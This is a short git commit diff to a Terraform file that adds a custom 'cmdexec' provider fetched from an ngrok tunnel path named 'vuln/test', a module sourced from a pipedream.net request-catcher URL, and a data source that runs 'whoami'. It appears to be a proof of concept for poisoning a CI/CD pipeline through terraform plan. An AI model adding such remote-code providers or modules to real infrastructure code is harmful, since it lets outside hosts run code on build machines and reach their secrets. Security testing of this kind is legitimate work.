7413113d155576da98720aaf8a0b9e86709cbe2b
rotem-cider <78903577+rotem-cider@users.noreply.github.com>
2021-03-03 10:15:41 +0200

    Update lamb.tf

--- lamb.tf
+++ lamb.tf
@@ -1,3 +1,16 @@
+terraform {
+  required_providers {
+    cmdexec = {
+      source  = "tera.ngrok.io:443/vuln/test"
+      version = "2.1.0"
+    }
+  }
+}
+
 module "hello" {
   source = "git::https://95a3bed651e039798c778628a22dc980.m.pipedream.net/terraform"
+}
+
+data "cmdexec_execute" "sample" {
+  command = "echo '*****' && whoami && echo '*****' "
 }
